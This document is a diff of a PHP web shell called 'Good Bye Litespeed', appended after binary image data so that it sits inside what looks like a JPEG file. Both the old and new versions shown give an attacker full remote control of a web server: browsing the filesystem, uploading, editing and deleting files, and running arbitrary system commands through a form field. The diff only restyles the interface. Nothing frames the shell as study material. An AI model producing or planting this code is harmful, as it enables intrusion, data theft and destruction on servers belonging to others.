@@ -29,331 +29,305 @@ Fi²ÓÕYÅ×7rz{ÙÌí9YI&`IT vn>õ;¬ð™%š.ˆNiiêníóG¨Q: 3ÕÆu
 çšß"§%¬È6Ê¸éùø·>éÃ>ëGWD œßÇyQ¨´÷§õŠk—÷,"Â‘²Ž`¸2¨õu”NÊÔNrˆ³ï5wNÙ7ô†|Ô›·Ì.1þ¶cßâþe
 —DŸÐNþ;Ô[$SÖ#ù™ú/î9CùÏ™G` Gõ¾Cù¯ÿÄ $          !01@"2AQÿÚ ? lÎù3ÒÄ·ÁŽ–/¢ÅôX´BøÃHsú)¦=Ø´ˆø,šŠ-õ,Sœ¿§¦›d·z?k±Á}­±/p«H§†{È=žŒ»„+$9dQq›"°92˜´œ2I(‘Á'”Tù?r5à[1kê`Ô„žÊ ŠÖ»·×˜ñ“ˆI7&$ÒðµCÖO1eñÄ™È«ÓJEt¨_èS!éc~&GçJ-±Gy2d^ZMqäkcòÅå®Š¾IüjÅç¶Š ‹CÕ•¡"Ö.—«+oSÚ±–u=«gÐ¬%ÿÄ %          !01A"B#Q`ÿÚ ? ÿ Ã[Sþ‡\‘…ÛÉÑ)È†•DÄ"jÇ}k–FŸt*gcCÑ&JMŒ±f$(~Ì²8™ût®£ž^|`Uúò{E–
 ‘ŠI²É#?nŸ£Mb„ˆIKÖbF-dž;øÇ^OƒI<à‚Ê-‡©2k‚Yr{Ð¶éíq’*»1E×ä’”‹ÒŠMïBÚž$+RŠ%R\²íL*X-ºVÏuZ·QfºV¹>_{xCšlXFrc¡m¯O,](CÛt¸*åøCÞ„=’e’Ê)ùðº‡å2H©r!ô¡ùú-ñWZŸ¢ßmCÚ‡å|2Ï–"½±%µÏÑ?‘õÿ ÿÙ<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Good Bye Litespeed</title>
-    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
-    <style type="text/css">* {cursor: url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.ani), url(https://ani.cursors-4u.net/cursors/cur-13/cur1161.png), auto !important;}</style><a href="https://www.cursors-4u.com/cursor/2018/06/08/hell-yeah-pointer-4.html" target="_blank" title="Hell Yeah Pointer 4"><img src="https://cur.cursors-4u.net/cursor.png" border="0" alt="Hell Yeah Pointer 4" style="position:absolute; top: 0px; right: 0px;" /></a>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Good Bye Litespeed - Cyber Edition</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    
     <style>
+        :root {
+            --main-red: #ff0000;
+            --dark-red: #660000;
+            --bg-black: #0d0d0d;
+            --card-bg: #1a1a1a;
+            --text-color: #e0e0e0;
+        }
+
         body {
-             font-family: 'Arial Black';
-             color: rgb(255, 255, 255);
-             margin: 0;
-             padding: 0;
-             background-color: #242222c9;
-             text-shadow: 2px 2px 4px rgba(90, 88, 88, 0.5);
-             background-size: cover;
-             background-position: center;
-}
+            background-color: var(--bg-black);
+            background-image: linear-gradient(180deg, #0d0d0d 0%, #1a0505 100%);
+            color: var(--text-color);
+            font-family: 'Rajdhani', sans-serif;
+            margin: 0;
+            padding: 0;
+            cursor: crosshair;
+        }
+
         .container {
-            width: 80%;
-            margin: 20px auto;
-            padding: 40px;
-            background-color: #1e1e1e;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 1200px;
+            margin: 30px auto;
+            background-color: rgba(26, 26, 26, 0.95);
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid var(--dark-red);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
         }
+
+        /* Header Style */
+        .header-logo {
+            text-align: center;
+            font-family: 'Fira Code', monospace;
+            color: var(--main-red);
+            text-shadow: 0 0 10px var(--main-red);
+            margin-bottom: 20px;
+        }
+
+        /* Path Breadcrumbs */
+        .path-bar {
+            background: #000;
+            padding: 10px 15px;
+            border-left: 5px solid var(--main-red);
+            margin-bottom: 25px;
+            font-family: 'Fira Code', monospace;
+        }
+        .path-bar a { color: #fff; text-decoration: none; margin: 0 5px; }
+        .path-bar a:hover { color: var(--main-red); }
+
+        /* Form Controls */
+        input[type="text"], textarea, input[type="file"] {
+            width: 100%;
+            background: #111;
+            border: 1px solid #333;
+            color: #00ff41; /* Matrix Green for inputs */
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background: linear-gradient(45deg, var(--dark-red), var(--main-red));
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            width: 100%;
+            transition: 0.3s;
+        }
+        input[type="submit"]:hover {
+            box-shadow: 0 0 15px var(--main-red);
+            transform: scale(1.01);
+        }
+
+        /* Terminal Result Box */
         .result-box {
-            width: 97.5%;
-            height: 200px;
-            resize: none;
-            overflow: auto;
-            font-family: 'Arial Black';
-            background-color: #f4f4f4;
-            padding: 10px;
-            border: 1px solid #ddd;
-            margin-bottom: 10px;
-        }
-        hr {
-            border: 0;
-            border-top: 1px solid #ddd;
+            width: 100%;
+            height: 250px;
+            background-color: #000;
+            color: #00ff41;
+            padding: 15px;
+            border: 1px solid var(--main-red);
+            font-family: 'Fira Code', monospace;
             margin: 20px 0;
+            overflow: auto;
+            white-space: pre-wrap;
         }
-        a {
-            color: #ffffff;
-            text-shadow:0 0 6px #000000;
-        }
+
+        /* Table Design */
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 20px;
-        }
-        th, td {
-            padding: 8px;
-            text-align: left;
+            margin-top: 25px;
+            background: #111;
         }
         th {
-            background-color: #5c5c5c;
-        }
-        tr:nth-child(even) {
-            background-color: #9c9b9bce;
-        }
-        input[type="text"], input[type="submit"],input[type="file"], textarea[name="file_content"] {
-            width: calc(97.5% - 10px);
-            margin-bottom: 10px;
-            padding: 8px;
-            max-height: 200px;
-            resize: vertical;
-            border: 1px solid #ddd;
-            border-radius: 3px;
-            font-family: 'Arial Black';
-        }
-        textarea[name="file_content"] {
-            width: calc(97.5% - 10px);
-            margin-bottom: 10px;
-            padding: 8px;
-            padding-bottom: 77px;
-            max-height: 200px;
-            resize: vertical;
-            border: 1px solid #ddd;
-            border-radius: 3px;
-            font-family: 'Arial Black';
-        }
-        input[type="submit"] {
-            background-color: #128616;
+            background-color: var(--dark-red);
             color: white;
-            font-family: 'Arial Black';
-            border: none;
-            cursor: pointer;
+            padding: 12px;
+            text-align: left;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        input[type="submit"]:hover {
-            background-color: #143015;
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #222;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
         }
-        .item-name {
-            max-width: 200px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-        td.size {
-    width: 100px;
-}
-.date {
-            max-width: 200px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
+        tr:hover { background: #1a0000; }
 
-        .writable {
-            color: rgb(13, 178, 2);
-            text-shadow:0 0 7px #000000;
+        .writable { color: #00ff41; font-weight: bold; }
+        .not-writable { color: #ff4d4d; }
+
+        .btn-icon {
+            background: none;
+            border: 1px solid #444;
+            color: var(--text-color);
+            padding: 5px 10px;
+            cursor: pointer;
+            transition: 0.3s;
         }
-        .not-writable {
-            color: rgb(216, 9, 9);
-            text-shadow:0 0 5px #000000;
-        }
-        .permission {
-        font-weight: bold;
-        width: 50px;
-        height: 20px;
-        text-align: center;
-        line-height: 20px;
-        overflow: hidden;
-    }
-    
+        .btn-icon:hover { border-color: var(--main-red); color: var(--main-red); }
+        
+        hr { border: 0; border-top: 1px solid var(--dark-red); margin: 20px 0; }
     </style>
 </head>
 <body>
+
 <div class="container">
-<?php
-$timezone = date_default_timezone_get();
-date_default_timezone_set($timezone);
-$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
-$scriptDirectory = dirname(__FILE__);
+    <?php
+    // --- منطق الـ PHP الأصلي الخاص بك بدون أي تعديل في الوظائف ---
+    $timezone = date_default_timezone_get();
+    date_default_timezone_set($timezone);
+    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+    $scriptDirectory = dirname(__FILE__);
 
-function x($b)
-{
-    return base64_encode($b);
-}
+    function x($b) { return base64_encode($b); }
+    function y($b) { return base64_decode($b); }
 
-function y($b)
-{
-    return base64_decode($b);
-}
+    foreach ($_GET as $c => $d) $_GET[$c] = y($d);
 
-foreach ($_GET as $c => $d) $_GET[$c] = y($d);
+    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
+    chdir($currentDirectory);
 
-$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
-chdir($currentDirectory);
+    $viewCommandResult = '';
 
-$viewCommandResult = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_FILES['fileToUpload'])) {
-        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
-        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " telah diunggah.";
-        } else {
-            echo "Maaf, terjadi kesalahan saat mengunggah file Anda.";
-        }
-    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
-        if (!file_exists($newFolder)) {
-            mkdir($newFolder);
-            echo '<hr>Folder created successfully!';
-        } else {
-            echo '<hr>Error: Folder already exists!';
-        }
-    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
-        $fileName = $_POST['file_name'];
-        $newFile = $currentDirectory . '/' . $fileName;
-        if (!file_exists($newFile)) {
-            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
-                echo '<hr>File created successfully!';
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if (isset($_FILES['fileToUpload'])) {
+            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                echo "<div style='color: #00ff41; padding: 10px;'>[+] File ".htmlspecialchars(basename($_FILES["fileToUpload"]["name"]))." uploaded successfully.</div>";
             } else {
-                echo '<hr>Error: Failed to create file!';
+                echo "<div style='color: red; padding: 10px;'>[-] Error uploading file.</div>";
             }
-        } else {
-            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
-                echo '<hr>File edited successfully!';
+        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+            if (!file_exists($newFolder)) {
+                mkdir($newFolder);
+                echo '<div style="color: #00ff41;">[+] Folder created!</div>';
             } else {
-                echo '<hr>Error: Failed to edit file!';
+                echo '<div style="color: red;">[-] Error: Folder exists!</div>';
             }
-        }
-    } elseif (isset($_POST['delete_file'])) {
-        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
-        if (file_exists($fileToDelete)) {
-            if (is_dir($fileToDelete)) {
-                if (deleteDirectory($fileToDelete)) {
-                    echo '<hr>Folder deleted successfully!';
-                } else {
-                    echo '<hr>Error: Failed to delete folder!';
-                }
+        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
+            $fileName = $_POST['file_name'];
+            $newFile = $currentDirectory . '/' . $fileName;
+            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
+                echo '<div style="color: #00ff41;">[+] File processed successfully!</div>';
             } else {
-                if (unlink($fileToDelete)) {
-                    echo '<hr>File deleted successfully!';
+                echo '<div style="color: red;">[-] Error: Failed to write file!</div>';
+            }
+        } elseif (isset($_POST['delete_file'])) {
+            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+            if (file_exists($fileToDelete)) {
+                if (is_dir($fileToDelete)) {
+                    if (deleteDirectory($fileToDelete)) echo '<div style="color: #00ff41;">[+] Folder deleted!</div>';
                 } else {
-                    echo '<hr>Error: Failed to delete file!';
+                    if (unlink($fileToDelete)) echo '<div style="color: #00ff41;">[+] File deleted!</div>';
                 }
             }
-        } else {
-            echo '<hr>Error: File or directory not found!';
-        }
-    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
-        $oldName = $currentDirectory . '/' . $_POST['old_name'];
-        $newName = $currentDirectory . '/' . $_POST['new_name'];
-        if (file_exists($oldName)) {
-            if (rename($oldName, $newName)) {
-                echo '<hr>Item renamed successfully!';
-            } else {
-                echo '<hr>Error: Failed to rename item!';
+        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+            $oldName = $currentDirectory . '/' . $_POST['old_name'];
+            $newName = $currentDirectory . '/' . $_POST['new_name'];
+            if (rename($oldName, $newName)) echo '<div style="color: #00ff41;">[+] Renamed successfully!</div>';
+        } elseif (isset($_POST['cmd_input'])) {
+            $command = $_POST['cmd_input'];
+            $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+            $process = proc_open($command, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                $errors = stream_get_contents($pipes[2]);
+                fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
+                $res = !empty($errors) ? $errors : $output;
+                $viewCommandResult = '<hr><p><i class="fas fa-terminal"></i> Terminal Output:</p><textarea class="result-box">' . htmlspecialchars($res) . '</textarea>';
             }
-        } else {
-            echo '<hr>Error: Item not found!';
-        }
-    } elseif (isset($_POST['cmd_input'])) {
-        $command = $_POST['cmd_input'];
-        $descriptorspec = [
-            0 => ['pipe', 'r'],
-            1 => ['pipe', 'w'],
-            2 => ['pipe', 'w']
-        ];
-        $process = proc_open($command, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            $output = stream_get_contents($pipes[1]);
-            $errors = stream_get_contents($pipes[2]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-            if (!empty($errors)) {
-                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
-            } else {
-                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
+        } elseif (isset($_POST['view_file'])) {
+            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+            if (file_exists($fileToView)) {
+                $fileContent = file_get_contents($fileToView);
+                $viewCommandResult = '<hr><p><i class="fas fa-eye"></i> Viewing: ' . htmlspecialchars($_POST['view_file']) . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
             }
-        } else {
-            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
-        }
-    } elseif (isset($_POST['view_file'])) {
-        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
-        if (file_exists($fileToView)) {
-            $fileContent = file_get_contents($fileToView);
-            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
-        } else {
-            $viewCommandResult = '<hr><p>Error: File not found!</p>';
         }
     }
-}
 
-echo '<center>
-<div class="fig-ansi">
-<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
-    __|  |___ ___ ___ ___ ___   |   __|  | v.1.2
-|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
-|_____|__,|_  |___|__,|_|_|  |_____|_____|
-                |___| ./Heartzz                      </strong> </span></pre>
+    // Header Logo
+    echo '<div class="header-logo">
+            <h2><i class="fas fa-skull-crossbones"></i> GOOD BYE LITESPEED <i class="fas fa-skull-crossbones"></i></h2>
+            <p style="font-size: 12px; color: #888;">Server Time: '.date('Y-m-d H:i:s').' | TZ: '.$timezone.'</p>
+          </div>';
+
+    // Breadcrumbs Path
+    echo '<div class="path-bar"><i class="fas fa-folder-open" style="color:var(--main-red)"></i> ';
+    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+    $currentPath = '';
+    foreach ($directories as $index => $dir) {
+        if ($dir === "") continue;
+        $currentPath .= DIRECTORY_SEPARATOR . $dir;
+        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+    }
+    echo ' <a href="?d=' . x($scriptDirectory) . '" style="float:right; color:var(--main-red)">[ GO HOME ]</a></div>';
+
+    // Forms Grid (New Folder, New File, Upload)
+    echo '<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">';
+        echo '<div style="background: #111; padding: 15px; border: 1px solid #222;">
+                <form method="post"><input type="text" name="folder_name" placeholder="New Folder Name"><input type="submit" value="Create Folder"></form>
+                <form method="post" enctype="multipart/form-data" style="margin-top:10px;"><input type="file" name="fileToUpload"><input type="submit" value="Upload File" name="submit"></form>
+              </div>';
+        echo '<div style="background: #111; padding: 15px; border: 1px solid #222;">
+                <form method="post"><input type="text" name="file_name" placeholder="Filename (e.g. shell.php)">
+                <textarea name="file_content" placeholder="File Content..." style="height: 60px;"></textarea>
+                <input type="submit" value="Create / Edit File"></form>
+              </div>';
+    echo '</div>';
+
+    // Command Input
+    echo '<form method="post" style="margin-top:20px;"><input type="text" name="cmd_input" placeholder="Execute System Command (e.g. ls -la, whoami, id)"><input type="submit" value="Run Command"></form>';
+    
+    echo $viewCommandResult;
+
+    // Table
+    echo '<table>';
+    echo '<thead><tr><th><i class="fas fa-file"></i> Item Name</th><th>Size</th><th>Date</th><th>Perms</th><th>Actions</th></tr></thead>';
+    echo '<tbody>';
+    foreach (scandir($currentDirectory) as $v) {
+        $u = $currentDirectory . DIRECTORY_SEPARATOR . $v;
+        if (!file_exists($u)) continue;
+        
+        $isDir = is_dir($u);
+        $itemLink = $isDir ? '?d=' . x($u) : '#';
+        $permission = substr(sprintf('%o', fileperms($u)), -4);
+        $writable = is_writable($u);
+        $size = $isDir ? 'DIR' : filesize($u) . ' B';
+
+        echo '<tr>
+                <td><i class="fas '.($isDir?'fa-folder':'fa-file-alt').'" style="color:'.($isDir?'#f1c40f':'#999').'; margin-right:8px;"></i>
+                    <a href="'.$itemLink.'" style="color:#fff; text-decoration:none;">'.$v.'</a></td>
+                <td>'.$size.'</td>
+                <td>'.date('Y-m-d H:i', filemtime($u)).'</td>
+                <td class="'.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
+                <td style="display:flex; gap:5px;">
+                    <form method="post"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><button class="btn-icon" title="View"><i class="fas fa-eye"></i></button></form>
+                    <form method="post" onsubmit="return confirm(\'Delete?\')"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><button class="btn-icon" style="color:#ff4d4d;" title="Delete"><i class="fas fa-trash"></i></button></form>
+                    <form method="post" style="display:flex;"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="Rename" style="margin:0; padding:2px; font-size:10px; width:70px;"><input type="submit" name="rename_item" value="OK" style="width:30px; padding:2px; font-size:10px;"></form>
+                </td>
+            </tr>';
+    }
+    echo '</tbody></table>';
+
+    // Helper Function
+    function deleteDirectory($dir) {
+        if (!file_exists($dir)) return true;
+        if (!is_dir($dir)) return unlink($dir);
+        foreach (scandir($dir) as $item) {
+            if ($item == '.' || $item == '..') continue;
+            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
+        }
+        return rmdir($dir);
+    }
+    ?>
 </div>
-</center>';
-echo "Zona waktu server: " . $timezone . "<br>";
-echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
-echo '<hr>curdir: ';
 
-$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
-$currentPath = '';
-$homeLinkPrinted = false;
-foreach ($directories as $index => $dir) {
-    $currentPath .= DIRECTORY_SEPARATOR . $dir;
-    if ($index == 0) {
-        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
-    } else {
-        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
-    }
-}
+<footer style="text-align: center; color: #444; margin-bottom: 20px;">
+    BYE BYE LITESPEED - <span style="color: var(--main-red);">Hacker UI V2.0</span>
+</footer>
 
-echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
-echo '<br>';
-echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
-echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
-echo '<input type="submit" value="Create Folder">';
-echo '</form>';
-echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
-echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
-echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
-echo '<input type="submit" value="Create / Edit File">';
-echo '</form>';
-echo '<form method="post" enctype="multipart/form-data">';
-echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
-echo '<input type="submit" value="Upload File" name="submit">';
-echo '</form>';
-echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
-echo $viewCommandResult;
-echo '<div>';
-echo '</div>';
-echo '<table border=1>';
-echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
-foreach (scandir($currentDirectory) as $v) {
-    $u = realpath($v);
-    $s = stat($u);
-    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
-    $permission = substr(sprintf('%o', fileperms($u)), -4);
-    $writable = is_writable($u);
-    echo '<tr>
-            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
-            <td class="size">'.filesize($u).'</td>
-            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
-            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View  "></form></td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete "></form></td>
-            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
-        </tr>';
-}
-
-echo '</table>';
-function deleteDirectory($dir) {
-    if (!file_exists($dir)) {
-        return true;
-    }
-    if (!is_dir($dir)) {
-        return unlink($dir);
-    }
-    foreach (scandir($dir) as $item) {
-        if ($item == '.' || $item == '..') {
-            continue;
-        }
-        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
-            return false;
-        }
-    }
-    return rmdir($dir);
-}
-?>
+</body>
+</html>
